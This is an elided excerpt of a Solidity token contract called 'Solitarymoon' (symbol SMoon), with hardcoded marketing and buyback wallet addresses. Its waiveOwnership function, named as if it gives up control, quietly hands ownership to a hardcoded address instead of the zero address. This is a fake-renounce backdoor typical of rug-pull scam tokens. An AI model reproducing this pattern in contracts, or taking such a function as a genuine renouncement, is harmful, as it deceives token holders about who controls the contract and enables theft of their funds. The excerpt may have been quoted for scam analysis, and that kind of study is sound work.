...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x3De0aFe253F02E35443CD613d588f66213b929b7);
    }
...
contract Solitarymoon is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Solitary moon ";
    string private _symbol = "SMoon";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x31a13554e6C7d6C2f54Cb6a0AdC4404e3dcBA4e2);
    address payable public buybackWalletAddress = payable(0x14F461E3716724ceE511EdC6456869019dc015A0);
